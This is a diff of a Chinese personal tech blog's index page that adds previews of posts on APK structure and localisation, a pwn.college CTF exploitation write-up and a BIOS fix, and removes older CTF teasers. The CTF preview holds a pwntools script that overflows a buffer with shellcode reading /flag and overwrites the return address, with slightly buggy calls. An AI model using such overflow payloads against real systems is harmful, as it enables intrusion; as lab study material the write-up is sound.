@@ -194,6 +194,417 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="lylanfree">
+      <meta itemprop="description" content="持续学习的程序员">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lylanfree's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/" class="post-title-link" itemprop="url">初识APK文件结构、双开、汉化及基础修改</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-12-11 23:59:42" itemprop="dateCreated datePublished" datetime="2023-12-11T23:59:42+08:00">2023-12-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-23 10:17:59" itemprop="dateModified" datetime="2023-12-23T10:17:59+08:00">2023-12-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="apk结构">APK结构</h2>
+<p>APK全称为<code>Android Package</code>，实质为压缩文件，将后缀改为<strong>zip</strong>可以采用压缩工具将其解压。解压后，其主要包含的文件目录如下：</p>
+<figure>
+<img src="/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231212001151547.png" alt="APK结构">
+<figcaption aria-hidden="true">APK结构</figcaption>
+</figure>
+<p>其具体解释如下</p>
+<table>
+<colgroup>
+<col style="width: 24%">
+<col style="width: 75%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>文件</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>assets目录</td>
+<td>存放apk的静态资源文件，如图片、视频、音频等</td>
+</tr>
+<tr class="even">
+<td>lib目录</td>
+<td>armeabi-v7a用于大部分Android设备，arm64-v8a仅适用于64位Android设备，x86常用于Android模拟器，x86-64用于64位Android模拟器，其目录下的.so文件是c或c++语言编译形成的动态链接库文件</td>
+</tr>
+<tr class="odd">
+<td>META-INF目录</td>
+<td>保存应用的签名信息，可用于验证APK文件的完整性</td>
+</tr>
+<tr class="even">
+<td>res目录</td>
+<td>存放资源文件，包括图片，字符串等，其layout文件用于设计apk界面</td>
+</tr>
+<tr class="odd">
+<td>AndroidManifest.xml</td>
+<td>APK应用清单，每个应用根目录必须包含此文件，包括APP配置信息，如包名，版本，组件，权限，链接库</td>
+</tr>
+<tr class="even">
+<td>classes.dex</td>
+<td>应用运行的主要代码逻辑</td>
+</tr>
+<tr class="odd">
+<td>resources.arsc</td>
+<td>二进制资源文件，通过ID索引文件资源</td>
+</tr>
+</tbody>
+</table>
+<h2 id="应用双开及原理">应用双开及原理</h2>
+<table>
+<colgroup>
+<col style="width: 18%">
+<col style="width: 81%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>原理</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>修改包名</td>
+<td>系统认为是2个APP，实质为两个互不干扰的APP</td>
+</tr>
+<tr class="even">
+<td>魔改Framework</td>
+<td>例如小米自带多开</td>
+</tr>
+<tr class="odd">
+<td>虚拟化机制</td>
+<td>虚拟化Framework层，虚拟化文件系统，模拟Android对组件的管理，例如平行空间</td>
+</tr>
+<tr class="even">
+<td>以插件机制运行</td>
+<td>利用反射替换，动态代理（过滤），hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
+</tr>
+</tbody>
+</table>
+<figure>
+<img src="/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231213152217987.png" alt="APK共存步骤一">
+<figcaption aria-hidden="true">APK共存步骤一</figcaption>
+</figure>
+<p>点击APK共存，对包名进行修改，最后进行安装即可</p>
+<figure>
+<img src="/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231213152336390.png" alt="APK共存步骤二">
+<figcaption aria-hidden="true">APK共存步骤二</figcaption>
+</figure>
+<blockquote>
+<p>值得注意的是，此方法双开对包名信息进行了修改，若开发者在APP中对签名信息进行了校验，则不能简单修改包名进行双开。</p>
+</blockquote>
+<h2 id="汉化apk">汉化APK</h2>
+<p>使用专门的工具对外文软件内的资源进行读取、翻译、修改并回等一系列操作，使得软件界面呈现中文状态，但保留原程序代码和功能逻辑，其流程如下：</p>
+<figure>
+<img src="/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/105739b6qnot0ms5l1kime.png" alt="逆向流程">
+<figcaption aria-hidden="true">逆向流程</figcaption>
+</figure>
+<blockquote>
+<p>需要汉化的字符串基本上都是在arsc中，可以一键汉化，再部分润色。</p>
+</blockquote>
+<h2 id="androidmainfest.xml">AndroidMainfest.xml</h2>
+<p><code>AndroidMainfest.xml</code>是整个应用的描述文件，定义了四大组件信息（Activity、Service、Context
+provider，Broadcaster）</p>
+<table>
+<colgroup>
+<col style="width: 37%">
+<col style="width: 62%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>属性</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>versionCode</td>
+<td>版本号，主要用来更新，例如:12</td>
+</tr>
+<tr class="even">
+<td>versionName</td>
+<td>版本名，给用户看的，例如:1.2</td>
+</tr>
+<tr class="odd">
+<td>package</td>
+<td>包名，例如：com.zj.52pj.demo</td>
+</tr>
+<tr class="even">
+<td>uses-permission android:name=""</td>
+<td>应用权限，例如：android.permission.INTERNET 代表网络权限</td>
+</tr>
+<tr class="odd">
+<td>android:label="<span class="citation" data-cites="string/app_name">@string/app_name</span>"</td>
+<td>应用名称</td>
+</tr>
+<tr class="even">
+<td>android:icon="<span class="citation" data-cites="mipmap/ic_launcher">@mipmap/ic_launcher</span>"</td>
+<td>应用图标路径</td>
+</tr>
+<tr class="odd">
+<td>android:debuggable="true"</td>
+<td>应用是否开启debug权限</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>此文参考了吾爱破解论坛正己大佬的<a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1695796">文章</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/17/CSE494-S2023_program-exploitation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="lylanfree">
+      <meta itemprop="description" content="持续学习的程序员">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lylanfree's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/17/CSE494-S2023_program-exploitation/" class="post-title-link" itemprop="url">CSE494 S2023 Program Exploitation</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-09-17 11:04:25" itemprop="dateCreated datePublished" datetime="2023-09-17T11:04:25+08:00">2023-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-23 10:13:49" itemprop="dateModified" datetime="2023-12-23T10:13:49+08:00">2023-12-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>612</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>很久没写blog了，这怕是下半年来第一次提笔写起，就用这次的blog来记录下<strong>pwn.college</strong>网站的<em>CSE494-S2023</em>中<code>program exploitation</code>的解题过程吧</p>
+<h2 id="x01-level1-5">0x01 level1-5</h2>
+<p>level1特别简单，程序中直接输出了input
+buf地址，因此仅需要将显示flag的exp写入到输入地址处，然后将<code>challenge</code>函数返回地址覆盖为<strong>input
+buf</strong>地址即可。构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;/challenge/toddlerone_level1.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;The input buffer begins at &#x27;</span>)</span><br><span class="line">input_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Payload size: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x80</span>).encode())</span><br><span class="line"></span><br><span class="line">exp = asm(shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>))</span><br><span class="line">exp = exp.ljust(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">0x70</span>)</span><br><span class="line">exp += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> <span class="comment"># fake rbp</span></span><br><span class="line">exp += p64(input_addr)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Send your payload &#x27;</span>, exp)</span><br><span class="line"><span class="built_in">print</span>(p.recvall)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/11/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="lylanfree">
+      <meta itemprop="description" content="持续学习的程序员">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lylanfree's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/11/%E7%94%B5%E8%84%91%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">电脑知识</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-11 08:55:58 / Modified: 09:00:00" itemprop="dateCreated datePublished" datetime="2023-05-11T08:55:58+08:00">2023-05-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Life/" itemprop="url" rel="index"><span itemprop="name">Life</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>96</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>联想台式开机遇到<code>security password retry count exceeded</code>错误，估计BIOS出错了，按F1进入BIOS设置，然后按F9恢复默认设置，F10保存并退出，重启电脑就好了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/Redmi-AC2100-%E8%B7%AF%E7%94%B1%E5%99%A8-%E5%AE%98%E6%96%B9%E5%9B%BA%E4%BB%B6%E5%85%81%E8%AE%B8IPv6%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%E4%B8%8B%E6%B8%B8%E8%AE%BE%E5%A4%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -874,284 +1285,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/13/PWN/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="lylanfree">
-      <meta itemprop="description" content="持续学习的程序员">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lylanfree's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/13/PWN/" class="post-title-link" itemprop="url">PWN</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-13 17:22:47 / Modified: 17:24:42" itemprop="dateCreated datePublished" datetime="2022-09-13T17:22:47+08:00">2022-09-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>7.5k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>CTF中的pwn指的是通过通过程序本身的漏洞，编写利用脚本破解程序拿到主机的权限，这就需要对程序进行分析，了解操作系统的特性和相关漏洞，是一个难度比较大的分支。</p>
-<p>其分类有：栈溢出、堆溢出、整数溢出、格式化字符串漏洞等。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/09/13/PWN/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="lylanfree">
-      <meta itemprop="description" content="持续学习的程序员">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lylanfree's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" class="post-title-link" itemprop="url">逆向工程</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-13 17:15:53 / Modified: 17:25:05" itemprop="dateCreated datePublished" datetime="2022-09-13T17:15:53+08:00">2022-09-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>6.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>6 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="什么是逆向工程">什么是逆向工程</h3>
-<p>逆向工程（Reversing Engineering，RE）一般指通过分析物体、机械设备或系统，了解其结构、功能、行为等，掌握其原理并改善不足之处、添加新创意的一系列过程。</p>
-<p>代码逆向工程是逆向工程在软件领域中的应用，主要指对软件的结构，流程，算法，代码等进行逆向拆解和分析，其实质就是对软件进行深入细致的分析。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="lylanfree">
-      <meta itemprop="description" content="持续学习的程序员">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lylanfree's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="post-title-link" itemprop="url">密码学</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-09-13 15:50:05 / Modified: 17:25:13" itemprop="dateCreated datePublished" datetime="2022-09-13T15:50:05+08:00">2022-09-13</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>15k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>14 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>CTF密码学这方面学了大概半个月了，汇总一下密码学方面的知识吧，虽然不够完全，还有许多需要改进的地方，但还是总结一下，以防日后忘记 ^_^ 。</p>
-<h2 id="密码学概述">密码学概述</h2>
-<p>密码学（Cryptography）一般可分为古典密码学和现代密码学。</p>
-<p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p>
-<ul>
-<li>单表替换加密（Monoalphabetic Cipher）</li>
-<li>多表替换加密（Polyalphabetic Cipher）</li>
-<li>奇奇怪怪的加密方式</li>
-</ul>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1223,7 +1356,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1236,7 +1369,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1273,13 +1406,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
-    <span title="Symbols count total">224k</span>
+    <span title="Symbols count total">227k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">3:24</span>
+    <span title="Reading time total">3:26</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
